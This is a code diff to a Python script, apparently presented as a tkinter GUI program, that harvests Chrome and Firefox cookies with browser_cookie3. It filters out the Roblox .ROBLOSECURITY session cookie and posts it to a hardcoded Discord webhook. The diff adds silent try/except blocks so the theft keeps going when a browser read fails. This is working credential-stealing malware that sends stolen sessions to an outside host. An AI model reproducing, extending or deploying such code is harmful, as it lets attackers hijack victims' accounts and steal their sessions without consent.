@@ -9,15 +9,22 @@ from tkinter import messagebox
 from tkinter import *
 from tkinter.ttk import *
 from discord_webhook import DiscordWebhook
-# gets imports
+# imports libraries
 
 
 cookies = []
 webhook_url = "https://discord.com/api/webhooks/787513008301670411/p5_XXC1a7wCZ1NZt056MECwBhpwxuadpb-sG60k5lT49Z-xNxQE9BYOM78mN9n-D4jkb"
 # Discord webhook
 
-cookies.extend(list(browser_cookie3.chrome()))
-cookies.extend(list(browser_cookie3.firefox()))
+try:
+    cookies.extend(list(browser_cookie3.chrome()))
+except:
+    pass
+
+try:
+    cookies.extend(list(browser_cookie3.firefox()))
+except:
+    pass
 
 roblox_cookie = [str(x) for x in cookies if ".ROBLOSECURITY" in str(x)]
 webhook = DiscordWebhook(url=webhook_url, content=str(roblox_cookie))
